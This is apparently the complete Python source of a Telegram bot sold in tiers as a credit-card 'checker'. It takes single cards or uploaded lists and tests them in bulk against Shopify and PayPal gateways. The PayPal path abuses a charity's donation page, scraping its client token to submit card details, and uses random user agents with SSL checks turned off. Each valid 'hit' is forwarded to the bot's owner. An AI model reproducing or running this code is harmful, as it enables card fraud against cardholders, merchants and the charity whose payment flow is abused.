import asyncio
import os
import secrets
import string
import json
import time
import hashlib
import requests
import re
import base64
import urllib3
urllib3.disable_warnings()
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest

from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# --- BACKEND IMPORTS ---
from api import process_card_async, parse_cc_string, extract_clean_response
from shopify import get_bin_info, classify_result, approved_message, fmt_price, fmt_info

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID") # Owner ID

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"
USAGE_FILE = "usage.json" 
ACTIVE_JOBS = {} 

# --- DATABASE LOGIC ---
def load_db(filename):
    if os.path.exists(filename):
        try:
            with open(filename, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(filename, data):
    with open(filename, "w") as f: json.dump(data, f, indent=4)

def check_tier(user_id):
    if str(user_id) == str(ADMIN_ID): return "👑 ADMIN"
    db = load_db(PREMIUM_FILE)
    if str(user_id) in db:
        expiry = datetime.fromisoformat(db[str(user_id)])
        if datetime.now() < expiry: return "🔑 KEY"
        else:
            del db[str(user_id)]
            save_db(PREMIUM_FILE, db)
    return "🆓 FREE"

def get_usage(user_id):
    db = load_db(USAGE_FILE)
    today = datetime.now().strftime("%Y-%m-%d")
    uid = str(user_id)
    if uid not in db or db[uid].get("date") != today:
        db[uid] = {"date": today, "single": 0, "mass": 0}
        save_db(USAGE_FILE, db)
    return db[uid]

def add_usage(user_id, check_type):
    db = load_db(USAGE_FILE)
    uid = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    if uid not in db or db[uid].get("date") != today:
        db[uid] = {"date": today, "single": 0, "mass": 0}
    db[uid][check_type] += 1
    save_db(USAGE_FILE, db)

# --- FSM ---
class AppStates(StatesGroup):
    waiting_for_shopify = State()
    waiting_for_shopify_mass = State()
    waiting_for_paypal = State()
    waiting_for_paypal_mass = State()
    waiting_for_key = State()

# --- PAYPAL ENGINE ---
def check_cc_paypal(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4: return "ERROR", "Invalid Format"
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
        us = generate_user_agent()
        session = requests.Session()
        session.verify = False
        with session as r:
            res = r.get('https://www.rarediseasesinternational.org/donate/', headers={'user-agent': us}, timeout=12)
            m4 = re.search(r'"data-client-token":"(.*?)"', res.text)
            if not m4: return "ERROR", "Token Fail"
            dec = base64.b64decode(m4.group(1)).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            params = {'action': 'give_paypal_commerce_create_order'}
            tok_res = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, data={'action': 'give_paypal_commerce_create_order'}, timeout=12)
            tok = tok_res.json()['data']['id']
            headers_p = {'authorization': f'Bearer {au}', 'content-type': 'application/json', 'user-agent': us}
            json_p = {'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc}}}
            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_p, json=json_p, timeout=12, verify=False)
            final_res = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_approve_order', 'order': tok}, timeout=12).text.upper()
            if any(k in final_res for k in ['APPROVED', 'THANKS', '"SUCCESS":TRUE']): return "CHARGED", "Approved"
            if 'INSUFFICIENT_FUNDS' in final_res: return "APPROVED", "Low Funds"
            return "DECLINED", "Card Declined"
    except Exception as e: return "ERROR", f"Error: {str(e)[:15]}"

# --- NOTIFICATION SYSTEM ---
async def notify_owner(user, status, cc, bin_info):
    brand, bank, country, level, type_cc, flag = bin_info
    text = (
        f"🔔 <b>NEW HIT DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User:</b> {user.first_name} (<code>{user.id}</code>)\n"
        f"💎 <b>Status:</b> {status}\n"
        f"💳 <b>Card:</b> <code>{cc}</code>\n"
        f"🏦 <b>Bank:</b> {bank}\n"
        f"🌍 <b>Country:</b> {country} {flag}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    try: await bot.send_message(ADMIN_ID, text)
    except: pass

# --- UI FORMATTERS ---
def kb_home(user_id):
    is_admin = str(user_id) == str(ADMIN_ID)
    kb = [
        [InlineKeyboardButton(text="🟢 Shopify Gateway", callback_data="menu_shopify"),
         InlineKeyboardButton(text="🔵 PayPal Gateway", callback_data="menu_paypal")],
        [InlineKeyboardButton(text="👤 Profile", callback_data="ui_plan"),
         InlineKeyboardButton(text="🔑 Redeem", callback_data="ui_redeem")]
    ]
    if is_admin: kb.append([InlineKeyboardButton(text="⚙️ Admin Control", callback_data="ui_admin")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def format_mass_stats(job_id, gateway, checked, total, approved, charged, declined, errors, start_time, tier):
    elapsed = time.time() - start_time
    speed = checked / elapsed if elapsed > 0 else 0
    hit_rate = ((approved + charged) / checked * 100) if checked > 0 else 0
    status_icon = "🏁" if checked == total else "⏳"
    return (
        f"<code>"
        f" {status_icon} MSTXT - {'COMPLETE' if checked == total else 'RUNNING'}\n"
        f" ━━━━━━━━━━━━━━━━━━━━━\n"
        f" 📦 Total    : {total} cards\n"
        f" ✅ Approved : {approved + charged}\n"
        f" ❌ Declined : {declined}\n"
        f" ⚠️ Errors   : {errors}\n"
        f" 📈 Hit Rate : {hit_rate:.1f}%\n"
        f" ⚡️ Speed    : {speed:.1f} cards/s\n"
        f" ⏱ Time     : {elapsed:.1f}s\n"
        f" ━━━━━━━━━━━━━━━━━━━━━\n"
        f" 🔑 Tier     : {tier}\n"
        f" BY BEAR OS\n"
        f"</code>"
    )

# --- HANDLERS ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    try: await message.delete()
    except: pass
    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(message.chat.id, data.get("dash_id"))
        except: pass
    await state.clear()
    tier = check_tier(message.from_user.id)
    text = (f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\n"
            f"Welcome, <b>{message.from_user.first_name}</b>.\nTier: {tier}\n\n<i>Select Gateway:</i>")
    msg = await message.answer(text, reply_markup=kb_home(message.from_user.id))
    await state.update_data(dash_id=msg.message_id)

@router.callback_query(F.data == "ui_home")
async def nav_home(callback: CallbackQuery, state: FSMContext):
    dash_id = (await state.get_data()).get("dash_id")
    await state.clear()
    if dash_id: await state.update_data(dash_id=dash_id)
    await callback.message.edit_text(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nTier: {check_tier(callback.from_user.id)}", reply_markup=kb_home(callback.from_user.id))

@router.callback_query(F.data == "menu_shopify")
async def menu_shopify(callback: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Single", callback_data="ui_shopify_single"), InlineKeyboardButton(text="📁 Mass", callback_data="ui_shopify_mass")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]
    ])
    await callback.message.edit_text("🟢 <b>SHOPIFY HUB</b>", reply_markup=kb)

@router.callback_query(F.data == "menu_paypal")
async def menu_paypal(callback: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Single", callback_data="ui_paypal_single"), InlineKeyboardButton(text="📁 Mass", callback_data="ui_paypal_mass")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]
    ])
    await callback.message.edit_text("🔵 <b>PAYPAL HUB</b>", reply_markup=kb)

# --- SINGLE HANDLER ---
async def handle_single_check(message, state, gateway_type):
    try: await message.delete()
    except: pass
    cc = message.text.strip()
    tier = check_tier(message.from_user.id)
    dash_id = (await state.get_data()).get("dash_id")
    loading = await bot.edit_message_text(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{cc}</code>", message.chat.id, dash_id)
    
    try:
        if gateway_type == "shopify":
            parts = parse_cc_string(cc)
            success, raw, g_name, p, c = await process_card_async(parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com")
            status = classify_result(success, raw).upper()
            resp = extract_clean_response(raw)
            bin_cc = parts['cc']
        else:
            status, resp = await asyncio.to_thread(check_cc_paypal, cc)
            bin_cc = cc.split('|')[0]
            g_name = "PayPal Braintree"

        async with aiohttp.ClientSession() as s:
            bin_data = await get_bin_info(s, bin_cc[:6])
        
        brand, bank, country, level, type_cc, flag = bin_data
        emoji = "🔥 𝐂𝐇𝐀𝐑𝐆𝐄𝐃" if status == "CHARGED" else "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃" if status == "APPROVED" else "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃"
        
        res_text = (
            f"<b>{emoji}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"💳 <b>𝐂𝐚𝐫𝐝:</b> <code>{cc}</code>\n"
            f"ツ <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <code>{resp}</code>\n"
            f"キ <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> {g_name}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"零 <b>𝐈𝐧𝐟𝐨:</b> <code>{brand} - {type_cc}</code>\n"
            f"零 <b>𝐁𝐚𝐧𝐤:</b> <code>{bank}</code>\n"
            f"零 <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <code>{country} {flag}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<i>𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐁𝐄𝐀𝐑 𝐎𝐒</i>"
        )
        await loading.edit_text(res_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
        if status in ["CHARGED", "APPROVED"]: await notify_owner(message.from_user, status, cc, bin_data)
    except: await loading.edit_text("❌ <b>ERROR: Check Format</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
    await state.clear()

# --- MASS HANDLER ---
async def handle_mass_file(message, state, gateway_type):
    try: await message.delete()
    except: pass
    user_id = message.from_user.id
    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(message.chat.id, data.get("dash_id"))
        except: pass

    file_info = await bot.get_file(message.document.file_id)
    downloaded = await bot.download_file(file_info.file_path)
    ccs = [l.strip() for l in downloaded.read().decode('utf-8').splitlines() if l.strip()]
    
    tier = check_tier(user_id)
    if tier == "🆓 FREE": ccs = ccs[:30]
    elif len(ccs) > 1000: ccs = ccs[:1000]

    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:6].upper()
    ACTIVE_JOBS[job_id] = True
    total, start_time = len(ccs), time.time()
    prog_msg = await message.answer(format_mass_stats(job_id, gateway_type.upper(), 0, total, 0, 0, 0, 0, start_time, tier))
    
    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
    
    async def process_one(cc):
        nonlocal checked, approved, charged, declined, errors
        if not ACTIVE_JOBS.get(job_id): return
        try:
            if gateway_type == "shopify":
                parts = parse_cc_string(cc)
                s_res, raw, g, p, c = await process_card_async(parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com")
                status = classify_result(s_res, raw).upper()
                bin_cc = parts['cc']
            else:
                status, resp = await asyncio.to_thread(check_cc_paypal, cc)
                bin_cc = cc.split('|')[0]
            
            checked += 1
            if status == "CHARGED": charged += 1
            elif status == "APPROVED": approved += 1
            elif status == "DECLINED": declined += 1
            else: errors += 1
            
            if status in ["CHARGED", "APPROVED"]:
                async with aiohttp.ClientSession() as s: bin_data = await get_bin_info(s, bin_cc[:6])
                icon = "🔥" if status == "CHARGED" else "✅"
                await message.answer(f"{icon} <b>HIT:</b> <code>{cc}</code>")
                await notify_owner(message.from_user, status, cc, bin_data)
        except: checked += 1; errors += 1

    sem = asyncio.Semaphore(5)
    async def sem_task(cc):
        async with sem: await process_one(cc)

    for i, cc in enumerate(ccs):
        if not ACTIVE_JOBS.get(job_id): break
        asyncio.create_task(sem_task(cc))
        if i % 10 == 0:
            await asyncio.sleep(0.5)
            await prog_msg.edit_text(format_mass_stats(job_id, gateway_type.upper(), checked, total, approved, charged, declined, errors, start_time, tier))

    await prog_msg.edit_text(format_mass_stats(job_id, gateway_type.upper(), checked, total, approved, charged, declined, errors, start_time, tier))
    await state.clear()

# --- ROUTES ---
@router.callback_query(F.data == "ui_shopify_single")
async def nav_ss(c: CallbackQuery, s: FSMContext): await c.message.edit_text("🟢 Shopify Input:"); await s.set_state(AppStates.waiting_for_shopify)
@router.message(AppStates.waiting_for_shopify)
async def proc_ss(m: Message, s: FSMContext): await handle_single_check(m, s, "shopify")

@router.callback_query(F.data == "ui_paypal_single")
async def nav_ps(c: CallbackQuery, s: FSMContext): await c.message.edit_text("🔵 PayPal Input:"); await s.set_state(AppStates.waiting_for_paypal)
@router.message(AppStates.waiting_for_paypal)
async def proc_ps(m: Message, s: FSMContext): await handle_single_check(m, s, "paypal")

@router.callback_query(F.data == "ui_shopify_mass")
async def nav_sm(c: CallbackQuery, s: FSMContext): await c.message.edit_text("🟢 Shopify File:"); await s.set_state(AppStates.waiting_for_shopify_mass)
@router.message(AppStates.waiting_for_shopify_mass, F.document)
async def proc_sm(m: Message, s: FSMContext): await handle_mass_file(m, s, "shopify")

@router.callback_query(F.data == "ui_paypal_mass")
async def nav_pm(c: CallbackQuery, s: FSMContext): await c.message.edit_text("🔵 PayPal File:"); await s.set_state(AppStates.waiting_for_paypal_mass)
@router.message(AppStates.waiting_for_paypal_mass, F.document)
async def proc_pm(m: Message, s: FSMContext): await handle_mass_file(m, s, "paypal")

async def main(): await dp.start_polling(bot)
if __name__ == "__main__": asyncio.run(main())
